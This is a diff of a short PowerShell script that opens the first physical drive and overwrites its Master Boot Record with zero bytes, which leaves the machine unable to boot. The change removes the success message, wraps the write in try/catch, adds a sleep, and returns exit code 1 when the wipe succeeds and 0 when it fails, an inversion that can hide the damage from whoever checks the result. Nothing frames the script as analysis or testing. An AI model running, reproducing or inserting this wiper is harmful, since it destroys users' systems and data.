@@ -1,9 +1,14 @@
 $MBR_SIZE = 512
 
-$MasterBootRecord = [System.IO.FileStream]::new("\\.\PhysicalDrive0", [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite)
-$mbrData = New-Object byte[] $MBR_SIZE
-$MasterBootRecord.Write($mbrData, 0, $MBR_SIZE)
-$MasterBootRecord.Close()
-
-Write-Host "Master Boot Record overwritten successfully."
-
+try {
+    $MasterBootRecord = [System.IO.File]::Open("\\.\PhysicalDrive0", [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite)
+    $MBRData = New-Object Byte[] $MBR_SIZE
+    $MasterBootRecord.Write($MBRData, 0, $MBR_SIZE)
+    Start-Sleep -Seconds 5
+    $MasterBootRecord.Close()
+    Exit 1
+}
+catch {
+    # Exception handling code
+    Exit 0
+}
